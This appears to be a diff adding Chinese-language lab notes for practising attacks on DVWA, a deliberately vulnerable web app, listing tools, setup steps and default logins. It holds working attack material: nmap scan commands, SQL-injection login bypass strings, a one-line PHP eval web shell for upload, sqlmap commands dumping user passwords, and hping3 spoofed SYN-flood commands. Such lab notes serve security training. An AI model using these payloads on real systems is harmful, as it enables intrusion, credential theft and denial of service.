@@ -1,0 +1,63 @@
+【安装包】
+filezilla,phpstudy,dvwa,jre,notepad++,everything,chrome,firefox,xshell,python,navicat
+Avira,nmap,appscan,burpsuite,sqlmap,菜刀,NGS-SQuirrel,Wireshark,Hping,[Nessus<online>],[CIS-CAT],[Codenomicon]
+netcat
+
+【环境安装】
+1、将DVWA的发布包拷贝到phpstudy的WWW目录下
+2、重命名config/config.inc.php.dist为config/config.inc.php
+3、修改config/config.inc.php文件内mysql数据库root的密码为环境的密码
+4、http://ip/DVWA
+
+DVWA默认的用户有5个，用户名密码如下（一个足以）：
+admin/password
+gordonb/abc123
+1337/charley
+pablo/letmein
+smithy/password
+
+=========病毒扫描/赛门铁克、Avira
+1.netcat 和 菜刀
+2.防病毒软件扫描
+
+==========端口扫描/nmap
+1. tcp端口扫描
+nmap -v -sS -sV -n -Pn -p1-65535 --reason -oX tcp_result.xml <host>
+2. udp端口扫描
+nmap -v -sU -sV -n -Pn -p1-65535 --reason -oX udp_result.xml <host>
+3. 开发协议扫描
+nmap -v -sO -n -P0 -oX protocol.xml <host>
+
+==========http漏洞扫描/Appscan
+1.appscan扫描
+2.报告分析
+
+==========burpsuite扫描/Burpsuite
+1.拦截报文
+2.spider
+3.scanner
+4.分析报告
+
+=========破解登陆/Burpsuite
+1.注释login.php中L16
+2.admin' # 或 admin' -- 
+
+=========getshell/菜刀
+1.上传文件<?php eval($_POST[cmd]);?>
+2.菜刀连接http://ip/DVWA/hackable/uploads/sh.php
+3.文件浏览 & 虚拟终端命令行
+
+==========数据漏洞扫描/NGS-SQuirrel
+
+==========SQL注入/SQLMap
+1.安装python
+2.安装sqlmap
+3.python sqlmap.py -u "url" --cookie "cookie" --dbs
+-D dvwa --tables
+-D dvwa -T users --columns
+-D dvwa -T users -C "user,password" --dump
+
+===========洪泛攻击/Hping
+1.探测端口：hping3 -I eth0 -S <ip> -p 80
+2.拒绝服务：hping3 -I etho0 -a <src> -S <dest> -p 80 -i u1000
+===========抓包分析/Wireshark
